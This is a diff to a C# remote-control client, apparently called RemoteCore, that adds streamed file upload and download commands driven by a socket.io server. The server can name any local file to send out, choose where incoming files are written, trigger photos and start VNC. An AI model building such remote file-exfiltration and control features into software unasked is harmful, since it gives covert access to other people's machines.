@@ -102,7 +102,17 @@ namespace RemoteCore
 
         private void RegisterEvents()
         {
-            _socket.OnConnected += (sender, e) => Console.WriteLine("Connected to server");
+            _socket.OnConnected += async (sender, e) =>
+            {
+                Console.WriteLine("Connected to server");
+                try
+                {
+                    await _socket.EmitAsync("client_capabilities", new { streaming = true });
+                }
+                catch
+                {
+                }
+            };
             _socket.OnDisconnected += (sender, e) => Console.WriteLine("Disconnected from server");
 
             _socket.On("shoot", async response => await TakePhotoAsync());
@@ -144,6 +154,26 @@ namespace RemoteCore
                 string filename = data.GetProperty("filename").GetString() ?? "";
                 string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
                 await DownloadFileFromServerAsync(url, targetDir, filename, transferId);
+            });
+
+            _socket.On("start_stream_upload", async response =>
+            {
+                var data = response.GetValue<JsonElement>();
+                string uploadUrl = data.GetProperty("upload_url").GetString() ?? "";
+                string path = data.GetProperty("path").GetString() ?? "";
+                string filename = data.GetProperty("filename").GetString() ?? "";
+                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
+                await StreamUploadAsync(uploadUrl, path, filename, transferId);
+            });
+
+            _socket.On("start_stream_download", async response =>
+            {
+                var data = response.GetValue<JsonElement>();
+                string downloadUrl = data.GetProperty("download_url").GetString() ?? "";
+                string targetDir = data.GetProperty("target_dir").GetString() ?? "";
+                string filename = data.GetProperty("filename").GetString() ?? "";
+                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
+                await StreamDownloadAsync(downloadUrl, targetDir, filename, transferId);
             });
 
             _socket.On("start_vnc", response =>
@@ -575,6 +605,133 @@ namespace RemoteCore
             }
         }
 
+        private async Task StreamUploadAsync(string uploadUrl, string path, string filename, string transferId)
+        {
+            try
+            {
+                if (!File.Exists(path))
+                {
+                    await _socket.EmitAsync("client_upload_error", new { error = "File not found: " + path, transfer_id = transferId });
+                    return;
+                }
+
+                if (string.IsNullOrWhiteSpace(transferId))
+                {
+                    transferId = Guid.NewGuid().ToString("N");
+                }
+
+                long totalBytes = new FileInfo(path).Length;
+                long lastReportedBytes = 0;
+                long lastReportTick = 0;
+
+                var fileStream = File.OpenRead(path);
+                var content = new ProgressStreamContent(
+                    fileStream,
+                    totalBytes,
+                    FileTransferBufferSize,
+                    uploaded =>
+                    {
+                        var now = Environment.TickCount64;
+                        if (uploaded == totalBytes || now - lastReportTick >= FileTransferProgressIntervalMs)
+                        {
+                            lastReportTick = now;
+                            if (uploaded != lastReportedBytes)
+                            {
+                                lastReportedBytes = uploaded;
+                                _ = _socket.EmitAsync("file_transfer_progress", new
+                                {
+                                    transfer_id = transferId,
+                                    stage = "upload_to_server",
+                                    filename,
+                                    transferred = uploaded,
+                                    total = totalBytes
+                                });
+                            }
+                        }
+                    }
+                );
+
+                using var req = new HttpRequestMessage(HttpMethod.Post, uploadUrl);
+                req.Content = content;
+                req.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+
+                using var cts = new CancellationTokenSource(FileTransferTimeout);
+                var resp = await _fileHttpClient.SendAsync(req, HttpCompletionOption.ResponseHeadersRead, cts.Token);
+                resp.EnsureSuccessStatusCode();
+            }
+            catch (Exception ex)
+            {
+                await _socket.EmitAsync("client_upload_error", new { error = ex.Message, transfer_id = transferId });
+            }
+        }
+
+        private async Task StreamDownloadAsync(string downloadUrl, string targetDir, string filename, string transferId)
+        {
+            try
+            {
+                string safeFilename = Path.GetFileName(filename);
+                if (string.IsNullOrEmpty(safeFilename))
+                    throw new ArgumentException("Invalid filename");
+
+                if (string.IsNullOrWhiteSpace(transferId))
+                {
+                    transferId = Guid.NewGuid().ToString("N");
+                }
+
+                string fullTargetDir = Path.GetFullPath(targetDir);
+                string targetPath = Path.GetFullPath(Path.Combine(fullTargetDir, safeFilename));
+
+                if (!targetPath.StartsWith(fullTargetDir, StringComparison.OrdinalIgnoreCase))
+                    throw new UnauthorizedAccessException("Path traversal detected");
+
+                if (!Directory.Exists(fullTargetDir)) Directory.CreateDirectory(fullTargetDir);
+
+                using var cts = new CancellationTokenSource(FileTransferTimeout);
+                using var response = await _fileHttpClient.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead, cts.Token);
+                response.EnsureSuccessStatusCode();
+
+                var totalBytes = response.Content.Headers.ContentLength;
+                long downloaded = 0;
+                long lastReportedBytes = 0;
+                long lastReportTick = 0;
+
+                await using var source = await response.Content.ReadAsStreamAsync(cts.Token);
+                await using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, FileTransferBufferSize, useAsync: true);
+                var buffer = new byte[FileTransferBufferSize];
+                while (true)
+                {
+                    int read = await source.ReadAsync(buffer, cts.Token);
+                    if (read <= 0) break;
+                    await fs.WriteAsync(buffer.AsMemory(0, read), cts.Token);
+                    downloaded += read;
+
+                    var now = Environment.TickCount64;
+                    if (!totalBytes.HasValue || downloaded == totalBytes.Value || now - lastReportTick >= FileTransferProgressIntervalMs)
+                    {
+                        lastReportTick = now;
+                        if (downloaded != lastReportedBytes)
+                        {
+                            lastReportedBytes = downloaded;
+                            _ = _socket.EmitAsync("file_transfer_progress", new
+                            {
+                                transfer_id = transferId,
+                                stage = "download_from_server",
+                                filename,
+                                transferred = downloaded,
+                                total = totalBytes
+                            });
+                        }
+                    }
+                }
+
+                await _socket.EmitAsync("client_download_complete", new { success = true, path = targetPath, transfer_id = transferId });
+            }
+            catch (Exception ex)
+            {
+                await _socket.EmitAsync("client_download_complete", new { error = ex.Message, transfer_id = transferId });
+            }
+        }
+
         private async Task DownloadFileFromServerAsync(string url, string targetDir, string filename, string transferId)
         {
             try
@@ -659,18 +816,23 @@ namespace RemoteCore
                 Headers.ContentLength = _length;
             }
 
-            protected override async Task SerializeToStreamAsync(Stream stream, TransportContext? context)
+            protected override async Task SerializeToStreamAsync(Stream stream, TransportContext? context, CancellationToken cancellationToken)
             {
                 var buffer = new byte[_bufferSize];
                 long uploaded = 0;
                 while (true)
                 {
-                    int read = await _source.ReadAsync(buffer);
+                    int read = await _source.ReadAsync(buffer.AsMemory(0, buffer.Length), cancellationToken);
                     if (read <= 0) break;
-                    await stream.WriteAsync(buffer.AsMemory(0, read));
+                    await stream.WriteAsync(buffer.AsMemory(0, read), cancellationToken);
                     uploaded += read;
                     _progress(uploaded);
                 }
+            }
+
+            protected override Task SerializeToStreamAsync(Stream stream, TransportContext? context)
+            {
+                return SerializeToStreamAsync(stream, context, CancellationToken.None);
             }
 
             protected override bool TryComputeLength(out long length)
